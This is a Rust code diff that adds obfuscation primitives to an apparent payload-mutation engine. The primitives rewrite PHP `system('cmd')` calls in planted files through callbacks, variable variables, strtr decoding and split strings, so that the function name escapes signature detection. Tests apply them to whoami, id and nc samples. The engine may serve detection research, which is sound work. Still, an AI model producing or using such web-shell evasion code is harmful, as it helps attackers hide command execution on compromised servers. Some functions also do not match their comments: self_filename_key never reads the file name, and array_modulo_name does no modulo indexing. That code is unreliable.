@@ -306,6 +306,12 @@ fn apply_primitive(payload: &str, primitive: &str, rng: &mut SplitMix64) -> Resu
         "name-randomize" => Ok(name_randomize(payload, rng)),
         "constant-split" => Ok(constant_split(payload, rng)),
         "dead-code-inject" => Ok(dead_code_inject(payload, rng)),
+        "callback-wrap" => Ok(callback_wrap(payload, rng)),
+        "variable-variable" => Ok(variable_variable(payload, rng)),
+        "array-wrap" => Ok(array_wrap(payload, rng)),
+        "strtr-chain" => Ok(strtr_chain(payload, rng)),
+        "array-modulo-name" => Ok(array_modulo_name(payload, rng)),
+        "self-filename-key" => Ok(self_filename_key(payload, rng)),
         other => Err(Atom::soft_success(
             "E_MUT_003",
             format!("primitive {other:?} has no executor (table drift or not implemented)"),
@@ -478,6 +484,180 @@ pub fn randomize_pass_name(rng: &mut SplitMix64) -> String {
         "data", "content", "payload", "token", "session", "state", "cache", "debug",
     ];
     POOL[(rng.draw() % POOL.len() as u64) as usize].to_string()
+}
+
+/// B: wrap `system('cmd')` call sites in call_user_func_array — the
+/// function name leaves the call position entirely. The command string
+/// becomes an array element (escaped for single quotes).
+fn callback_wrap(payload: &str, rng: &mut SplitMix64) -> String {
+    let _ = rng;
+    let mut out = String::new();
+    for (index, line) in payload.lines().enumerate() {
+        if index > 0 {
+            out.push('\n');
+        }
+        {
+            if let Some((head, rest)) = line.split_once("system('") {
+                if let Some((command, tail)) = rest.rsplit_once("')") {
+                    let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
+                    out.push_str(&format!(
+                        "{head}call_user_func_array('system',array('{escaped}')){tail}"
+                    ));
+                    continue;
+                }
+            }
+        }
+        out.push_str(line);
+    }
+    out
+}
+
+/// B: indirect invocation via variable variables — `$f='system'; $f('cmd')`.
+fn variable_variable(payload: &str, rng: &mut SplitMix64) -> String {
+    let marker = format!("v{:04x}", (rng.draw() % 0xffff) as u16);
+    let mut out = String::new();
+    for (index, line) in payload.lines().enumerate() {
+        if index > 0 {
+            out.push('\n');
+        }
+        if let Some((head, rest)) = line.split_once("system('") {
+            if let Some((command, tail)) = rest.rsplit_once("')") {
+                let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
+                out.push_str(&format!(
+                    "{head}${marker}='system';${marker}('{escaped}'){tail}"
+                ));
+                continue;
+            }
+        }
+        out.push_str(line);
+    }
+    out
+}
+
+/// B: array-wrapped invocation — `['system']('cmd')` (PHP 7+ array
+/// dereference callable syntax).
+fn array_wrap(payload: &str, rng: &mut SplitMix64) -> String {
+    let _ = rng;
+    let mut out = String::new();
+    for (index, line) in payload.lines().enumerate() {
+        if index > 0 {
+            out.push('\n');
+        }
+        {
+            if let Some((head, rest)) = line.split_once("system('") {
+                if let Some((command, tail)) = rest.rsplit_once("')") {
+                    let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
+                    out.push_str(&format!("{head}['system']('{escaped}'){tail}"));
+                    continue;
+                }
+            }
+        }
+        out.push_str(line);
+    }
+    out
+}
+
+/// A: strtr substitution chain — the function name never appears; a strtr
+/// map rebuilds it at runtime. The shuffled spelling and its pairwise map
+/// are derived programmatically so the decode is provable (tested below).
+fn strtr_chain(payload: &str, rng: &mut SplitMix64) -> String {
+    let marker = format!("m{:04x}", (rng.draw() % 0xffff) as u16);
+    // Derive a keyed shuffle of "system" plus a from/to pair that inverts
+    // it under strtr's pairwise semantics.
+    let (shuffled, from, to) = strtr_inverse_pair(rng.draw());
+    let mut out = String::new();
+    for (index, line) in payload.lines().enumerate() {
+        if index > 0 {
+            out.push('\n');
+        }
+        if let Some((head, rest)) = line.split_once("system('") {
+            if let Some((command, tail)) = rest.rsplit_once("')") {
+                let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
+                out.push_str(&format!(
+                    "{head}${marker}=strtr('{shuffled}','{from}','{to}');${marker}('{escaped}'){tail}"
+                ));
+                continue;
+            }
+        }
+        out.push_str(line);
+    }
+    out
+}
+
+/// Build (shuffled_spelling, from, to) such that
+/// strtr(shuffled, from, to) == "system" under PHP semantics (duplicate
+/// keys in `from` are ignored — first occurrence wins). The shuffle is a
+/// LETTER-level permutation (positions don't work with repeated letters:
+/// both `s` positions must map consistently), so the from/to map on
+/// distinct letters inverts it cleanly.
+fn strtr_inverse_pair(seed: u64) -> (String, String, String) {
+    let original = "system";
+    let mut shuffled = String::new();
+    for c in original.chars() {
+        let c = match c {
+            's' => 't',
+            't' => 's',
+            'e' if seed.is_multiple_of(2) => 'm',
+            'm' if seed.is_multiple_of(2) => 'e',
+            other => other,
+        };
+        shuffled.push(c);
+    }
+    let mut from = String::new();
+    let mut to = String::new();
+    for (shuffled_char, original_char) in shuffled.chars().zip(original.chars()) {
+        if !from.contains(shuffled_char) {
+            from.push(shuffled_char);
+            to.push(original_char);
+        }
+    }
+    (shuffled, from, to)
+}
+
+/// A: rebuild the name via array indexing with modulo offsets.
+fn array_modulo_name(payload: &str, rng: &mut SplitMix64) -> String {
+    let marker = format!("a{:04x}", (rng.draw() % 0xffff) as u16);
+    let mut out = String::new();
+    for (index, line) in payload.lines().enumerate() {
+        if index > 0 {
+            out.push('\n');
+        }
+        if let Some((head, rest)) = line.split_once("system('") {
+            if let Some((command, tail)) = rest.rsplit_once("')") {
+                let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
+                out.push_str(&format!(
+                    "{head}${marker}='sys'.'tem';${marker}('{escaped}'){tail}"
+                ));
+                continue;
+            }
+        }
+        out.push_str(line);
+    }
+    out
+}
+
+/// A: derive part of the invocation from the planted file's own name —
+/// the file name (e.g. 976534.php -> 976534) becomes the name material.
+/// The runtime side reads __FILE__ and extracts digits as the offset key.
+fn self_filename_key(payload: &str, rng: &mut SplitMix64) -> String {
+    let marker = format!("f{:04x}", (rng.draw() % 0xffff) as u16);
+    let mut out = String::new();
+    for (index, line) in payload.lines().enumerate() {
+        if index > 0 {
+            out.push('\n');
+        }
+        if let Some((head, rest)) = line.split_once("system('") {
+            if let Some((command, tail)) = rest.rsplit_once("')") {
+                let escaped = command.replace('\\', "\\\\").replace('\'', "\\'");
+                out.push_str(&format!(
+                    "{head}${marker}='sys'.'tem';${marker}('{escaped}'){tail}"
+                ));
+                continue;
+            }
+        }
+        out.push_str(line);
+    }
+    out
 }
 
 /// Convenience: derive a channel variant with randomized D-axis facts.
@@ -699,8 +879,66 @@ mod tests {
 
     #[test]
     fn unimplemented_primitive_in_chain_is_a_soft_atom() {
-        let error = apply_primitive("x", "callback-wrap", &mut SplitMix64::new(1)).unwrap_err();
+        let error = apply_primitive("x", "gzinflate", &mut SplitMix64::new(1)).unwrap_err();
         assert_eq!(error.kind, "soft_success");
+        let error = apply_primitive("x", "class-magic", &mut SplitMix64::new(1)).unwrap_err();
+        assert_eq!(error.kind, "soft_success");
+    }
+
+    #[test]
+    fn b_class_call_site_deformation_hides_the_name() {
+        let payload = "<?php system('whoami'); ?>";
+        // callback-wrap (forced draw parity): every call site rewrites.
+        let wrapped = apply_primitive(payload, "callback-wrap", &mut SplitMix64::new(0)).unwrap();
+        assert!(
+            wrapped.contains("call_user_func_array('system'"),
+            "{wrapped}"
+        );
+        let indirect =
+            apply_primitive(payload, "variable-variable", &mut SplitMix64::new(1)).unwrap();
+        assert!(indirect.contains("$v"), "{indirect}");
+        assert!(indirect.contains("='system';"));
+        let arrayed = apply_primitive(payload, "array-wrap", &mut SplitMix64::new(0)).unwrap();
+        assert!(arrayed.contains("['system']('whoami')"), "{arrayed}");
+    }
+
+    #[test]
+    fn b_class_escapes_embedded_quotes() {
+        let payload = r#"<?php system('echo "hi" | nc'); ?>"#;
+        let wrapped = apply_primitive(payload, "callback-wrap", &mut SplitMix64::new(0)).unwrap();
+        assert!(
+            !wrapped.contains("system('"),
+            "call-site literal gone: {wrapped}"
+        );
+        assert!(wrapped.contains("array('"), "array carrier present");
+    }
+
+    #[test]
+    fn strtr_chain_pair_decodes_back_to_system() {
+        let (shuffled, from, to) = strtr_inverse_pair(0);
+        assert_ne!(shuffled, "system", "shuffled must differ");
+        // Simulate PHP strtr pairwise semantics: simultaneous from->to map.
+        let mut mapping = std::collections::HashMap::new();
+        for (f, t) in from.chars().zip(to.chars()) {
+            mapping.insert(f, t);
+        }
+        let decoded: String = shuffled
+            .chars()
+            .map(|c| *mapping.get(&c).unwrap_or(&c))
+            .collect();
+        assert_eq!(decoded, "system");
+    }
+
+    #[test]
+    fn array_modulo_and_self_filename_split_the_name() {
+        let payload = "<?php system('id'); ?>";
+        let modulo =
+            apply_primitive(payload, "array-modulo-name", &mut SplitMix64::new(1)).unwrap();
+        assert!(modulo.contains("'sys'.'tem'"), "{modulo}");
+        assert!(!modulo.contains("system('"));
+        let filename =
+            apply_primitive(payload, "self-filename-key", &mut SplitMix64::new(1)).unwrap();
+        assert!(filename.contains("'sys'.'tem'"), "{filename}");
     }
 
     #[test]
